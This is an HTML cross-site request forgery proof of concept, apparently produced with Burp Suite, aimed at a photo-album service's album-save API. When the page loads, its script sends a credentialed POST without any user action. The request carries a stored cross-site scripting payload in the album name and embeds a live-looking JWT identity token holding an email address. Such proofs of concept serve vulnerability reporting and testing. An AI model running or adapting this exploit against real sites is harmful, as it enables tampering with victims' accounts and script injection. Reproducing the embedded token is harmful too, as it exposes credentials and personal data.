<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <script>
      function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https:\/\/cmd.thislife.com\/json?method=album.saveAlbum", true);
        xhr.setRequestHeader("accept", "application\/json, text\/javascript, *\/*; q=0.01");
        xhr.setRequestHeader("accept-language", "en-US,en;q=0.5");
        xhr.setRequestHeader("content-type", "application\/x-www-form-urlencoded; charset=UTF-8");
        xhr.withCredentials = true;
        var body = "{\"method\":\"album.saveAlbum\",\"params\":[\"eyJraWQiOiJpY1A4WExhT3B3cVlxQkdOXC9Bd1V1TFwvRU9BQVFHXC9Ic0hpSGZCMjFBbERFPSIsImFsZyI6IlJTMjU2In0.eyJzdWIiOiIwNjQxMDEwOC1kODg2LTRmYTktODVjNS1kMDA4ZDIzN2M2NmIiLCJjb2duaXRvOmdyb3VwcyI6WyJDb2duaXRvTmV3U2lnbnVwIl0sImlzcyI6Imh0dHBzOlwvXC9jb2duaXRvLWlkcC51cy1lYXN0LTEuYW1hem9uYXdzLmNvbVwvdXMtZWFzdC0xX1RtSHpvUTY5aiIsImNvZ25pdG86dXNlcm5hbWUiOiIwNjQxMDEwOC1kODg2LTRmYTktODVjNS1kMDA4ZDIzN2M2NmIiLCJnaXZlbl9uYW1lIjoidGVzdCIsIm9yaWdpbl9qdGkiOiJiMmVjZTI2Mi04YmZiLTQwYTItOThhMC01NTNiODgzZjRiODQiLCJhdWQiOiJ0OG9paWY1Mm1lY2U2YmxlZWFzMnBvZjBuIiwidXNlcl90eXBlIjoiQUNUIiwiZXZlbnRfaWQiOiI3OWRiN2E1My1jMWVhLTQzYTQtODcxMS03N2NiOGQzOTJiNjAiLCJzZmx5X3VpZCI6IjAyNjAxMTgzNTcyNiIsInRva2VuX3VzZSI6ImlkIiwic2NvcGUiOiJwcm9maWxlIHVzZXIiLCJhdXRoX3RpbWUiOjE2NjQxMTM5NjEsImV4cCI6MTY2NDExNzU2NCwiaWF0IjoxNjY0MTEzOTY0LCJmYW1pbHlfbmFtZSI6InRlc3QiLCJqdGkiOiJkZGQwOWNjYi1kYzIwLTQ4MjEtYjQyMC03NDE5OWMzNDg1NGUiLCJlbWFpbCI6IjB4cmFkaWlAZ21haWwuY29tIn0.AYmCtY5UVsmwqRKeuoZAxzCcyi0CgH8cFyqK-jqbJJgpStjJgPBorXGwCLKgc0XXle-0bDZrO9fOHd54RYEKu9ZOjcuqQ4eSIDPG84VX5vg1B95HSxlPNtScXO3zxfeTyBFljPlym4umnK0LrQ3pDMa537_bakyf9IAgLWGa1J3drUwovTLj5og7Gwa03vPB4JOsGLOyt8XfM6pixr2apIAs1Cwm4y--ygeW_-B9WuSwb1ZyySLEbKLdGjGOG8NLiDFKdTicYox-nS_UdDE7K-olU7voGdZnmsaeYPHnRuCRsJgMWTwuTJhH6aSyz8sXWrQ5Xa9EkVFiDhRgMr1nEA\",{\"uid\":\"1744950063005716\",\"life_uid\":\"026011835726\",\"folder_uid\":\"1744764485206734\",\"name\":\"xxx\x3cimg src/onerror=alert(99)\x3e\",\"facebook_sharing\":0,\"twitter_sharing\":false,\"tumblr_sharing\":false,\"sort_option\":\"moment_date:asc\",\"view_mode\":\"grid\"},null],\"headers\":{\"X-SFLY-SubSource\":\"albums\"},\"id\":null}";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
      }
      submitRequest();
    </script>
    <form action="#">
      <input type="button" value="Submit request" onclick="submitRequest();" />
    </form>
  </body>
</html>
